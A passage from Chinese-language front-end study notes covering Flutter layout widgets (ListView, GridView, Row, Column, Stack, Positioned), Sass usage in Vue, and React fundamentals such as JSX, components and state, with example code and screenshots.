        height: 200.0,
        margin: EdgeInsets.all(5),
        child: ListView(scrollDirection: Axis.horizontal, children: <Widget>[
          Container(
            width: 180.0,
            color: Colors.lightBlue,
          ),
          Container(
            width: 180.0,
            color: Colors.amber,
            child: ListView(
              children: <Widget>[
                Image.network(
                    'https://img2.baidu.com/it/u=3494680980,3429350889&fm=26&fmt=auto&gp=0.jpg'),
                Image.network(
                    'https://img2.baidu.com/it/u=3494680980,3429350889&fm=26&fmt=auto&gp=0.jpg'),
                Image.network(
                    'https://img2.baidu.com/it/u=3494680980,3429350889&fm=26&fmt=auto&gp=0.jpg'),
                SizedBox(height: 16.0),
                Text(
                  '这是一个文本信息',
                  textAlign: TextAlign.center,
                  style: TextStyle(fontSize: 16.0),
                )
              ],
            ),
          ),
          Container(
            width: 180.0,
            color: Colors.lightBlue,
          ),
          Container(
            width: 180.0,
            color: Colors.pink,
          ),
          Container(
            width: 180.0,
            color: Colors.lightBlue,
          ),
        ]));
  }
}
```

效果：

![image-20210808210534252](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210808210534.png)

#### 动态列表

基本写法1：

```
class ListWrapper extends StatelessWidget {
  //自定义方法
  List<Widget> _getData() {
    List<Widget> list = <Widget>[];
    for (var i = 0; i < 20; i++) {
      list.add(ListTile(
        title: Text("我是$i列表"),
      ));
    }
    return list;
  }

  @override
  Widget build(BuildContext context) {
    // TODO: implement build
    return ListView(children: this._getData());
  }
}
```

效果：

![image-20210809003203725](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210809003204.png)

写法二：

```
//./reslistData.dart

  List listData=[
      {
          "title": 'Candy Shop',
          "author": 'Mohamed Chahin',
          "imageUrl": 'https://www.itying.com/images/flutter/1.png',
      },
       {
          "title": 'Childhood in a picture',
          "author": 'Google',
          "imageUrl": 'https://www.itying.com/images/flutter/2.png',
      },
      {
          "title": 'Alibaba Shop',
          "author": 'Alibaba',
          "imageUrl": 'https://www.itying.com/images/flutter/3.png',
      },
      {
          "title": 'Candy Shop',
          "author": 'Mohamed Chahin',
          "imageUrl": 'https://www.itying.com/images/flutter/4.png',
      },
       {
          "title": 'Tornado',
          "author": 'Mohamed Chahin',
          "imageUrl": 'https://www.itying.com/images/flutter/5.png',
      },
      {
          "title": 'Undo',
          "author": 'Mohamed Chahin',
          "imageUrl": 'https://www.itying.com/images/flutter/6.png',
      },
      {
          "title": 'white-dragon',
          "author": 'Mohamed Chahin',
          "imageUrl": 'https://www.itying.com/images/flutter/7.png',
      }      

  ];

```

```
import './res/listData.dart';

//自定义方法
class ListWrapper extends StatelessWidget {
  //自定义方法
  List<Widget> _getData() {
    var tempList = listData.map((e) {
      return ListTile(
        leading: Image.network(e["imageUrl"]),
        title: Text(e["title"]),
        subtitle: Text(e["author"]),
      );
    });
    return tempList.toList();
  }

  @override
  Widget build(BuildContext context) {
    // TODO: implement build
    return ListView(children: this._getData());
  }
}
```

效果：

![image-20210809003441297](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210809003441.png)

写法三：

```
import './res/listData.dart';

class ListWrapper extends StatelessWidget {
  //自定义方法
  Widget _getListData(context, index) {
    return ListTile(
      leading: Image.network(listData[index]["imageUrl"]),
      title: Text(listData[index]["title"]),
      subtitle: Text(listData[index]["author"]),
    );
  }

  @override
  Widget build(BuildContext context) {
    // TODO: implement build
    return ListView.builder(
        itemCount: listData.length, itemBuilder: this._getListData);
  }
}
```

效果：

![image-20210809003654897](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210809003655.png)

### GridView(网格布局)

> 当数据量很大的时候用矩阵方式排列比较清晰。此时我们可以用网格列表组件 GridView 实 
>
> 现布局。 当数据量很大的时候用矩阵方式排列比较清晰。此时我们可以用网格列表组件 GridView 实 
>
> 现布局。 

**GridView** 创建网格列表有多种方式，下面我们主要介绍两种。

1、通过 GridView.count 实现网格布局 

2、通过 GridView.builder 实现网格布局

常用属性：

![image-20210810021231471](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210810021231.png)

基本用法一：

```
   class GridViewWarpper extends StatelessWidget {
       @override
       Widget build(BuildContext context) {
         return GridView.count(
           //一行的Widget数量
           crossAxisCount: 2,
           children: <Widget>[
             Text('这是一个文本'),
             Text('这是一个文本'),
             Text('这是一个文本'),
             Text('这是一个文本'),
             Text('这是一个文本'),
             Text('这是一个文本'),
             Text('这是一个文本'),
             Text('这是一个文本'),
             Text('这是一个文本'),
             Text('这是一个文本'),
           ],
         );
       }
     }
```

效果：

![image-20210810021356342](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210810021356.png)

基本用法二：

```
     class GridViewWarpper extends StatelessWidget {
       List<Widget> _getListData() {
         List<Widget> list = <Widget>[];
         for (var i = 0; i < 20; i++) {
           list.add(Container(
               alignment: Alignment.center,
               child: Text(
                 '这是第$i条数据',
                 style: TextStyle(color: Colors.white, fontSize: 20),
               ),
               color: Colors.blue));
         }
         return list;
       }
       @override
       Widget build(BuildContext context) {
         return GridView.count(
           //一行的Widget数量
           crossAxisCount: 2,
           // 水平Widget的间距
           crossAxisSpacing: 20.0,
           //垂直Widget的间距
           mainAxisSpacing: 20.0,
           //元素宽度与高度的比例
           childAspectRatio: 1,
           //内边距
           padding: EdgeInsets.all(10),
           children: _getListData(),
         );
       }
     }
```

效果：

![image-20210810021520493](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210810021520.png)

基本用法三（用于动态显示请求的数据）：

```
    import './res/listData.dart';//这里数据和上面的一致
    class GridViewWarpper extends StatelessWidget {
       List<Widget> _getListData() {
         var tempList = listData.map((value) {
           return Container(
             child: Column(
               children: [
                 Image.network(value['imageUrl']),
                 //占位
                 SizedBox(
                   height: 10,
                 ),
                 Text(
                   value['title'],
                   textAlign: TextAlign.center,
                   style: TextStyle(fontSize: 20, color: Colors.pink),
                 ),
                 Text(value['author'])
               ],
             ),
           );
         });
         return tempList.toList();
       }
       @override
       Widget build(BuildContext context) {
         return GridView.count(
           //一行的Widget数量
           crossAxisCount: 2,
           children: _getListData(),
         );
       }
     }
```

效果：

![image-20210810021809336](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210810021809.png)

基本用法四：

```
class GridViewWarpper extends StatelessWidget {
  Widget _getListData(context, index) {
    return Container(
      child: Column(
        children: [
          Image.network(listData[index]['imageUrl']),
          SizedBox(
            height: 10,
          ),
          Text(
            listData[index]['title'],
            textAlign: TextAlign.center,
            style: TextStyle(fontSize: 20),
            overflow: TextOverflow.ellipsis,
            maxLines: 1,
          ),
          Text(
            listData[index]['author'],
            textAlign: TextAlign.center,
            style: TextStyle(fontSize: 12),
          )
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return GridView.builder(
        //控制布局，主要用在GridView.builder
        gridDelegate: SliverGridDelegateWithFixedCrossAxisCount(
          //水平方向上元素的距离
          crossAxisSpacing: 10.0, 
          //垂直方向上元素的距离
          mainAxisSpacing: 10.0, 
          //每行显示的Widget数
          crossAxisCount: 2
        ),
        itemCount: listData.length,
        itemBuilder: _getListData
      );
  }
}
```

效果：

![image-20210810022146405](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210810022146.png)

### Icon

图标链接：https://fonts.google.com/icons?selected=Material+Icons

基本使用：

```
     Icon(
       Icons.savings,
     ),
```

封装自定义组件：

```
import 'package:flutter/material.dart';

class IconContainer extends StatelessWidget {
  double size;
  Color containerColor;
  Color IconColor;
  IconData icon;
  IconContainer(this.icon,
      {this.containerColor = Colors.white,
      this.IconColor = Colors.black,
      this.size = 32.0});
  @override
  Widget build(BuildContext context) {
    // TODO: implement build
    return Container(
      height: 100.0,
      width: 100.0,
      color: this.containerColor,
      child: Center(
        child: Icon(this.icon, size: this.size, color: this.IconColor),
      ),
    );
  }
}
```

调用：

```
IconContainer(
     Icons.home,
     containerColor: Colors.pink,
),
```

### Padding

> 在html中常见的布局标签都有padding属性，但是Flutter中很多Widget是没有padding属性。这个时候我们可以用Padding组件处理容器与子元素直接间距。

![image-20210813224809633](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210813224810.png)

简单使用：

```
import 'package:flutter/material.dart';

class PaddingWarpper extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    // TODO: implement build
    return Padding(
        padding: EdgeInsets.fromLTRB(0, 0, 10, 10),
        child: GridView.count(
          crossAxisCount: 2,
          //子元素容器比例
          childAspectRatio: 1.7,
          children: [
            Padding(
              padding: EdgeInsets.fromLTRB(10, 10, 0, 0),
              child: Image.network('http://www.itying.com/images/flutter/1.png',
                  fit: BoxFit.cover),
            ),
            Padding(
              padding: EdgeInsets.fromLTRB(10, 10, 0, 0),
              child: Image.network('http://www.itying.com/images/flutter/2.png',
                  fit: BoxFit.cover),
            ),
            Padding(
              padding: EdgeInsets.fromLTRB(10, 10, 0, 0),
              child: Image.network('http://www.itying.com/images/flutter/3.png',
                  fit: BoxFit.cover),
            ),
            Padding(
              padding: EdgeInsets.fromLTRB(10, 10, 0, 0),
              child: Image.network('http://www.itying.com/images/flutter/4.png',
                  fit: BoxFit.cover),
            ),
            Padding(
              padding: EdgeInsets.fromLTRB(10, 10, 0, 0),
              child: Image.network('http://www.itying.com/images/flutter/5.png',
                  fit: BoxFit.cover),
            ),
            Padding(
              padding: EdgeInsets.fromLTRB(10, 10, 0, 0),
              child: Image.network('http://www.itying.com/images/flutter/6.png',
                  fit: BoxFit.cover),
            ),
            Padding(
              padding: EdgeInsets.fromLTRB(10, 10, 0, 0),
              child: Image.network('http://www.itying.com/images/flutter/1.png',
                  fit: BoxFit.cover),
            ),
            Padding(
              padding: EdgeInsets.fromLTRB(10, 10, 0, 0),
              child: Image.network('http://www.itying.com/images/flutter/2.png',
                  fit: BoxFit.cover),
            ),
            Padding(
              padding: EdgeInsets.fromLTRB(10, 10, 0, 0),
              child: Image.network('http://www.itying.com/images/flutter/3.png',
                  fit: BoxFit.cover),
            ),
            Padding(
              padding: EdgeInsets.fromLTRB(10, 10, 0, 0),
              child: Image.network('http://www.itying.com/images/flutter/4.png',
                  fit: BoxFit.cover),
            ),
          ],
        ));
  }
}
```

效果：

![image-20210813230236865](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210813230237.png)

### Row

> Row 是一个可以沿水平方向展示它的子组件的组件。
>
> 它还可以灵活布局，如果要让某个子组件填充满剩余剩余空间，请使用 Expanded 组件包裹该组件即可。
>
> Row 组件是不可以滚动的，所以在 Row 组件中一般不会放置过多子组件，如果需要滚动的话应该考虑使用 ListView。
>
> 如果需要垂直展示，应该考虑 Column 组件。
>
> 如果只有一个子组件的话，应该考虑使用使用 Align 或者 Container 组件来定位这个子组件。
>
> 说了这么多，对我来说，Row 就是一个 orientation 为 horizontal 的 LinearLayout。

**常用属性：**

- **crossAxisAlignment**：子组件沿着 Cross 轴（在 Row 中是纵轴）如何摆放，其实就是子组件对齐方式，可选值有：
      CrossAxisAlignment.start：子组件在 Row 中顶部对齐。
      CrossAxisAlignment.end：子组件在 Row 中底部对齐。
      CrossAxisAlignment.center：子组件在 Row 中居中对齐。
      CrossAxisAlignment.stretch：拉伸填充满父布局。
      CrossAxisAlignment.baseline：在 Row 组件中会报错
- **mainAxisAlignment**：子组件沿着 Main 轴（在 Row 中是横轴）如何摆放，其实就是子组件排列方式，可选值有：
      MainAxisAlignment.start：靠左排列。
      MainAxisAlignment.end：靠右排列。
      MainAxisAlignment.center：居中排列。
      MainAxisAlignment.spaceAround：每个子组件左右间隔相等，也就是 margin 相等。
      MainAxisAlignment.spaceBetween：两端对齐，也就是第一个子组件靠左，最后一个子组件靠右，剩余组件在中间平均分散排列。
      MainAxisAlignment.spaceEvenly：每个子组件平均分散排列，也就是宽度相等。
- **mainAxisSize**：Main 轴大小，可选值有：
     MainAxisSize.max：相当于 Android 的 match_parent。
     MainAxisSize.min：相当于 Android 的 wrap_content。
- **textDirection**：子组件排列顺序，可选值有：
     TextDirection.ltr：从左往右开始排列。
     TextDirection.rtl：从右往左开始排列。
- **verticalDirection**：确定如何在垂直方向摆放子组件，以及如何解释 start 和 end，指定 height 可以看到效果，可选     值有：
      VerticalDirection.up：Row 从下至上开始摆放子组件，此时我们看到的底部其实是顶部。
      VerticalDirection.down：Row 从上至下开始摆放子组件，此时我们看到的顶部就是顶部。
- **children**：子组件，值是一个 Widget 数组。

简单使用：

```
     import 'package:flutter/material.dart';
     import './Icon.dart';

     class RowWarpper extends StatelessWidget {
       @override
       Widget build(BuildContext context) {
         // TODO: implement build
         return Container(
           height: 600,
           width: 400.0,
           color: Colors.lightBlue,
           child: Row(
               // 主轴元素排列，类似与flex的justify-content
               mainAxisAlignment: MainAxisAlignment.spaceEvenly,
               // 侧轴元素排列，类似与flex的jalign-content
               crossAxisAlignment: CrossAxisAlignment.center,
               children: [
                 //这里是一个封装的自定义的Icon
                 IconContainer(
                   Icons.home,
                   containerColor: Colors.pink,
                 ),
                 IconContainer(
                   Icons.home,
                   containerColor: Colors.pink,
                 ),
                 IconContainer(
                   Icons.home,
                   containerColor: Colors.pink,
                 ),
               ]),
         );
       }
     }
```

效果：

![image-20210813234054004](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210813234054.png)

### Column

> Column 就相当于一个 orientation 为 vertical 的 LinearLayout。它的用法完全与 Row 一样

属性可以参考Row的

**基本使用：**

```
import 'package:flutter/material.dart';
import './Icon.dart';
import './res/listData.dart';

class ColumnWarpper extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    // TODO: implement build
    return Container(
      height: 600,
      width: 400.0,
      color: Colors.lightBlue,
      child: Column(
          mainAxisAlignment: MainAxisAlignment.spaceEvenly,
          crossAxisAlignment: CrossAxisAlignment.center,
          children: [
            IconContainer(
              Icons.home,
              containerColor: Colors.pink,
            ),
            IconContainer(
              Icons.home,
              containerColor: Colors.pink,
            ),
            IconContainer(
              Icons.home,
              containerColor: Colors.pink,
            ),
          ]),
    );
  }
}

```

效果：

![image-20210814030008708](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210814030009.png)

### Expanded

> Expanded组件是flutter中使用率很高的一个组件，它可以动态调整child组件沿主轴的尺寸，比如填充剩余空间，比如设置尺寸比例。Expanded 可以用在 Row 和 Column 布局中

属性：

![image-20210814030551790](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210814030552.png)

基本使用1：

```
import 'package:flutter/material.dart';
import './Icon.dart';

//基本用法一：
class ExpandedWarpper extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    // TODO: implement build
    return Container(
      height: 600,
      width: 400.0,
      color: Colors.lightBlue,
      child: Row(
          mainAxisAlignment: MainAxisAlignment.spaceEvenly,
          crossAxisAlignment: CrossAxisAlignment.center,
          children: [
            Expanded(
              flex: 1,
              child: IconContainer(
                Icons.home,
                containerColor: Colors.pink,
              ),
            ),
            Expanded(
              flex: 2,
              child: IconContainer(
                Icons.home,
                containerColor: Colors.yellow,
              ),
            ),
            Expanded(
              flex: 1,
              child: IconContainer(
                Icons.home,
                containerColor: Colors.red,
              ),
            ),
          ]),
    );
  }
}
```

效果：

![image-20210814030759150](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210814030759.png)

基本用法二：

```
import 'package:flutter/material.dart';
import './Icon.dart';
class ExpandedWarpper extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    // TODO: implement build
    return Container(
      height: 600,
      width: 400.0,
      color: Colors.lightBlue,
      child: Row(
          mainAxisAlignment: MainAxisAlignment.spaceEvenly,
          crossAxisAlignment: CrossAxisAlignment.center,
          children: [
            IconContainer(
              Icons.home,
              containerColor: Colors.yellow,
            ),
            Expanded(
              flex: 1,
              child: IconContainer(
                Icons.home,
                containerColor: Colors.pink,
              ),
            ),
            Expanded(
              flex: 3,
              child: IconContainer(
                Icons.home,
                containerColor: Colors.red,
              ),
            ),
          ]),
    );
  }
}
```

效果：

![](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210814030844.png)

### Stack

> Stack表示堆的意思，我们可以用Stack或者Stack结合Align或者Stack结合Positioned来实现页面的定位布局

常用属性：

![image-20210814215207744](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210814215208.png)

简单使用：

```
     class StackWarpper extends StatelessWidget {
       @override
       Widget build(BuildContext context) {
         return Center(
           child: Stack(
             // 元素对齐位置
             // alignment: Alignment.center,
             //(-1,-1)是起点，（0，0）是居中
             alignment: Alignment(-1, -1),
             children: [
               Container(
                 height: 400,
                 width: 300,
                 color: Colors.pink,
               ),
               Text(
                 '我是一个文本1',
                 style: TextStyle(fontSize: 20, color: Colors.white),
               ),
               Text('我是一个文本2222')
             ],
           ),
         );
       }
     }
```

效果：

![image-20210814220315600](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210814220316.png)

### Align

> Align用来确定子控件在父布局中的位置

构造函数如下：

```
const Align({
    Key key,
    this.alignment = Alignment.center,
    this.widthFactor,
    this.heightFactor,
    Widget child,
})
```

alignment属性设置子控件的位置，Alignment中已定义了如下几种位置并且可以使用-1到1来控制位置：

  Alignment.topLeft：顶部左边
 		Alignment.topCenter：顶部中间
		 Alignment.topRight：顶部右边
		 Alignment.centerLeft：中部左边
		 Alignment.center：中部中间
		 Alignment.centerRight：中部右边
		 Alignment.bottomLeft：底部左边
		 Alignment.bottomCenter：底部中间
		 Alignment.bottomRight：底部右边
简单使用:

```
import 'package:flutter/material.dart';
//配合Align组件实现任意元素定位布局
class StackWarpper extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return Container(
      width: 200,
      height: 200,
      color: Colors.pink,
      child: Stack(
        // 元素对齐位置
        // alignment: Alignment.center,
        // (-1,-1)是起点，（0，0）是居中
        alignment: Alignment(0, 0),
        children: [
          Align(
            alignment: Alignment(1, -0.2),
            child: Icon(
              Icons.home,
              size: 40,
              color: Colors.blue,
            ),
          ),
          Align(
            alignment: Alignment.center,
            child: Icon(
              Icons.search,
              size: 40,
              color: Colors.blue,
            ),
          ),
          Align(
            alignment: Alignment.bottomRight,
            child: Icon(
              Icons.settings,
              size: 40,
              color: Colors.blue,
            ),
          ),
        ],
      ),
    );
  }
}
```

效果：

![image-20210814221323626](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210814221324.png)

### Positioned

> 层叠布局和Web中的绝对定位、Android中的Frame布局是相似的，子组件可以根据距父容器四个角的位置来确定自身的位置。绝对定位允许子组件堆叠起来（按照代码中声明的顺序）。Flutter中使用`Stack`和`Positioned`这两个组件来配合实现绝对定位。`Stack`允许子组件堆叠，而`Positioned`用于根据`Stack`的四个角来确定子组件的位置。

构造函数如下

```
Stack({
  this.alignment = AlignmentDirectional.topStart,
  this.textDirection,
  this.fit = StackFit.loose,
  this.overflow = Overflow.clip,
  List<Widget> children = const <Widget>[],
})
```

常用属性：

![image-20210814223356404](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210814223356.png)

简单使用：

```
import 'package:flutter/material.dart';
//配合Positioned组件实现任意元素定位布局
class StackWarpper extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return Container(
      width: 200,
      height: 200,
      color: Colors.pink,
      child: Stack(
        // 元素对齐位置
        // alignment: Alignment.center,
        //(-1,-1)是起点，（0，0）是居中
        alignment: Alignment(0, 0),
        children: [
          Positioned(
            left: 0,
            bottom: 0,
            child: Icon(
              Icons.home,
              size: 40,
              color: Colors.blue,
            ),
          ),
          Positioned(
            left: 100,
            bottom: 100,
            child: Icon(
              Icons.settings,
              size: 40,
              color: Colors.blue,
            ),
          ),
          Positioned(
            right: 0,
            bottom: 0,
            child: Icon(
              Icons.search,
              size: 40,
              color: Colors.blue,
            ),
          ),
        ],
      ),
    );
  }
}
```

效果：

![image-20210814223507221](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210814223507.png)

# Sass

## 简介

Sass 是一个 CSS 预处理器。

Sass 是 CSS 扩展语言，可以帮助我们减少 CSS 重复的代码，节省开发时间。

Sass 完全兼容所有版本的 CSS。

Sass 扩展了 CSS3，增加了规则、变量、混入、选择器、继承、内置函数等等特性。

Sass 生成良好格式化的 CSS 代码，易于组织和维护。

Sass 文件后缀为 **.scss**。

## 在Vue中使用Sass

### 安装环境

```
npm install -D sass-loader node-sass
```

### 基本使用

现在，除了能够 `import 'style.scss'`，我们还可以在 Vue 组件中使用 SCSS：

```
<style lang="scss">
/* 在这里撰写 SCSS */
</style>
```

1. Sass 变量使用 **$** 符号：

   ```
   $myFont: Helvetica, sans-serif;
   $myColor: red;
   $myFontSize: 18px;
   $myWidth: 680px;
   body {
     font-family: $myFont;
     font-size: $myFontSize;
     color: $myColor;
   }
   #container {
     width: $myWidth;
   }
   ```

2. Sass作用域

   Sass 变量的作用域只能在当前的层级上有效果，如下所示 h1 的样式为它内部定义的 green，p 标签则是为 red。

   ```
   $myColor: red;
   h1 {
     $myColor: green;   // 只在 h1 里头有用，局部作用域
     color: $myColor;
   }
   p {
     color: $myColor;
   }
   ```

   将以上代码转换为 CSS 代码，如下所示：

   ```
   h1 {
     color: green;
   }
   p {
     color: red;
   }
   ```

3. Sass嵌套规则与属性（和Less语法一致）

   Sass 代码：

   ```
   nav {
     ul {
       margin: 0;
       padding: 0;
       list-style: none;
     }
     li {
       display: inline-block;
     }
     a {
       display: block;
       padding: 6px 12px;
       text-decoration: none;
     }
   }
   ```

   将以上代码转换为 CSS 代码，如下所示：

   ```
   nav ul {
     margin: 0;
     padding: 0;
     list-style: none;
   }
   nav li {
     display: inline-block;
   }
   nav a {
     display: block;
     padding: 6px 12px;
     text-decoration: none;
   }
   ```

4. Sass嵌套属性

   很多 CSS 属性都有同样的前缀，例如：font-family, font-size 和 font-weight ， text-align, text-transform 和 text-overflow。

   在 Sass 中，我们可以使用嵌套属性来编写它们：

   Sass代码：

   ```
   font: {
     family: Helvetica, sans-serif;
     size: 18px;
     weight: bold;
   }
   text: {
     align: center;
     transform: lowercase;
     overflow: hidden;
   }
   ```

   将以上代码转换为 CSS 代码，如下所示：

   ```
   font-family: Helvetica, sans-serif;
   font-size: 18px;
   font-weight: bold;
   
   text-align: center;
   text-transform: lowercase;
   text-overflow: hidden;
   ```

   

# React

## 简介

> React 是一个用于构建用户界面的 JAVASCRIPT 库。
>
> React 主要用于构建UI，很多人认为 React 是 MVC 中的 V（视图）。
>
> React 起源于 Facebook 的内部项目，用来架设 Instagram 的网站，并于 2013 年 5 月开源。
>
> React 拥有较高的性能，代码逻辑非常简单，越来越多的人已开始关注和使用它。

**React 特点**

- **1.声明式设计** −React采用声明范式，可以轻松描述应用。
- **2.高效** −React通过对DOM的模拟，最大限度地减少与DOM的交互。
- **3.灵活** −React可以与已知的库或框架很好地配合。
- **4.JSX** − JSX 是 JavaScript 语法的扩展。React 开发不一定使用 JSX ，但我们建议使用它。
- **5.组件** − 通过 React 构建组件，使得代码更加容易得到复用，能够很好的应用在大项目的开发中。
- **6.单向响应的数据流** − React 实现了单向响应的数据流，从而减少了重复代码，这也是它为什么比传统数据绑定更简单。

## React的基本使用

首先要导入相关js库文件(react.js, react-dom.js, babel.min.js)，要按这个顺序来导入

第一个实例：

```
     <!DOCTYPE html>
     <html lang="en">
       <head>
         <meta charset="UTF-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <title>Helloworld</title>
       </head>
       <body>
         <!-- 准备好一个容器 -->
         <div id="test"></div>
         <!-- 引入react核心库 -->
         <script src="https://unpkg.com/react@16/umd/react.development.js"></script>
         <!-- 引入react-dom 用于支持react操作dom -->
         <script src="https://unpkg.com/react-dom@16/umd/react-dom.development.js"></script>
         <!-- 引入babel 用于将jsx转为js -->
         <script src="https://unpkg.com/babel-standalone@6.15.0/babel.min.js"></script>
         <!-- 此处的type一定要写成text/babel -->
         <script type="text/babel">
           //1、创建虚拟dom元素对象
           var vDOM = <h1>Hello React</h1> //此处一定不要写引号，因为不是字符串
           //2、将虚拟DOM渲染到页面真实DOM容器中
           // ReactDOM.render(vDOM,document.getElementById("test"))
         </script>
       </body>
     </html>
```

![image-20210202231228310](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221421.png)

###  JSX的理解和使用

1). 理解
			全称: JavaScript XML
			react定义的一种类似于XML的JS扩展语法: XML+JS
			作用: 用来创建react虚拟DOM(元素)对象

2). 编码相关
	* js中直接可以套标签, 但标签要套js需要放在{}中
	* 在解析显示js数组时, 会自动遍历显示
	* 把数据的数组转换为标签的数组: 
		var liArr = dataArr.map(function(item, index){
			return <li key={index}>{item}</li>
	* }

jsx语法规则：
					1.定义虚拟DOM时，不要写引号。
					2.标签中混入JS表达式时要用{}。
					3.样式的类名指定不要用class，要用className。
					4.内联样式，要用style={{key:value}}的形式去写。
					5.只有一个根标签
					6.标签必须闭合
					7.标签首字母
							(1).若小写字母开头，则将该标签转为html中同名元素，若html中无该标签对应的同名元素，则报错。
							(2).若大写字母开头，react就去渲染对应的组件，若组件没有定义，则报错。

### 1.4. 几个重要概念理解

### 模块与组件

1. 模块:

  	     理解: 向外提供特定功能的js程序, 一般就是一个js文件
  	     为什么: js代码更多更复杂
  	     作用: 复用js, 简化js的编写, 提高js运行效率
2. 组件: 
	理解: 用来实现特定功能效果的代码集合(html/css/js)

  	     为什么: 一个界面的功能太复杂了
  	     作用: 复用编码, 简化项目界面编码, 提高运行效率
### 模块化与组件化

         1. 模块化:
              当应用的js都以模块来编写的, 这个应用就是一个模块化的应用
         2. 组件化:
              当应用是以多组件的方式实现功能, 这上应用就是一个组件化的应用


## react组件化开发

### 基本理解和使用

1). 自定义的标签: 组件类(函数)/标签
	  2). 创建组件类

 **方式1: 无状态函数(简单组件, 推荐使用)**

```
 	function MyComponent1(props) {
    		 return <h1>自定义组件标题11111</h1>
     }
```

  实例：

```
     <!DOCTYPE html>
     <html lang="en">
     <head>
       <meta charset="UTF-8" />
       <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       <title>Helloworld</title>
     </head>
     <body>
       <!-- 准备好一个容器 -->
       <div id="test"></div>
       <!-- 引入react核心库 -->
       <script src="../commonjs/react.development.js"></script>
       <!-- 引入react-dom 用于支持react操作dom -->
       <script src="../commonjs/react-dom.development.js"></script>
       <!-- 引入babel 用于将jsx转为js -->
       <script src="../commonjs/babel.min.js"></script>
       <!-- 此处的type一定要写成text/babel -->
       <script type="text/babel">
         //1、创建函数式组件
         function MyComponent() {
           return <h2>我是用函数定义的组件（适用于【简单组件】的定义</h2>
         }
         //2、渲染组件到页面中
         ReactDOM.render(<MyComponent/>, document.getElementById("test"))
         // 执行了ReactDOM.render(<MyComponent/>)......之后，发生了什么？
         //     1、React解析组件标签，找到了MyCommonent组件
         //     2、发现组件是使用函数定义的，随后调用该函数，将返回的虚拟DOM转为真实DOM,随后呈现在页面中
       </script>
     </body>
     </html>
```

**方式2: ES6类语法(复杂组件, 推荐使用)**

```
     class MyComponent3 extends React.Component {
    		 render () {
    			 return <h1>自定义组件标题33333</h1>
     	}
     }
```

实例：

```
     <!DOCTYPE html>
     <html lang="en">
     <head>
       <meta charset="UTF-8" />
       <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       <title>Helloworld</title>
     </head>
     <body>
       <!-- 准备好一个容器 -->
       <div id="test"></div>
       <!-- 引入react核心库 -->
       <script src="../commonjs/react.development.js"></script>
       <!-- 引入react-dom 用于支持react操作dom -->
       <script src="../commonjs/react-dom.development.js"></script>
       <!-- 引入babel 用于将jsx转为js -->
       <script src="../commonjs/babel.min.js"></script>
       <!-- 此处的type一定要写成text/babel -->
       <script type="text/babel">
         //1、创建类式组件
         class MyComponent extends React.Component {
           render() {
             //render是放在哪里的？ -MyComponent的原型对象上，供实例使用
             //render中的this是谁？ -MyComponent的实例对象
             console.log('render中的this:',this);
             return <h2>我是用类定义的组件（适用于【复杂组件】的定义</h2>
           }
         }
         //2、渲染组件到页面中
         ReactDOM.render(<MyComponent />, document.getElementById("test"))
         // 执行了ReactDOM.render(<MyComponent/>)......之后，发生了什么？
         //     1、React解析组件标签，找到了MyCommonent组件
         //     2、发现组件是使用函数定义的，随后调用该函数，将返回的虚拟DOM转为真实DOM,随后呈现在页面中
       </script>
     </body>
     </html>
```

### 组件的3大属性

#### state

> state是组件对象最重要的属性，值是对象(可以包含多个key-value的组合)

1. 组件被称为"状态机", 页面的显示是根据组件的state属性的数据来显示
2. 初始化指定:
    constructor() {
      super()
      this.state = {
        stateName1 : stateValue1,
        stateName2 : stateValue2
      }
    }
3. 读取显示: 
    this.state.stateName1
4. 更新状态-->更新界面 : 
    this.setState({stateName1 : newValue})

```
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>state</title>
</head>
<body>
	<!-- 准备好一个“容器” -->
	<div id="test"></div>
	<!-- 引入react核心库 -->
	<script type="text/javascript" src="../commonjs/react.development.js"></script>
	<!-- 引入react-dom，用于支持react操作DOM -->
	<script type="text/javascript" src="../commonjs/react-dom.development.js"></script>
	<!-- 引入babel，用于将jsx转为js -->
	<script type="text/javascript" src="../commonjs/babel.min.js"></script>
	<script type="text/babel">
		//1.创建组件
		class Weather extends React.Component{
			//构造器调用几次？ ———— 1次
			constructor(props){
				console.log('constructor');
				super(props)
				//初始化状态
				this.state = {isHot:false,wind:'微风'}
				//解决changeWeather中this指向问题
				this.changeWeather = this.changeWeather.bind(this)
			}

			//render调用几次？ ———— 1+n次 1是初始化的那次 n是状态更新的次数
			render(){
				console.log('render');
				//读取状态
				const {isHot,wind} = this.state
				return <h1 onClick={this.changeWeather}>今天天气很{isHot ? '炎热' : '凉爽'}，{wind}</h1>
			}

			//changeWeather调用几次？ ———— 点几次调几次
			changeWeather(){
				//changeWeather放在哪里？ ———— Weather的原型对象上，供实例使用
				//由于changeWeather是作为onClick的回调，所以不是通过实例调用的，是直接调用
				//类中的方法默认开启了局部的严格模式，所以changeWeather中的this为undefined
				
				console.log('changeWeather');
				//获取原来的isHot值
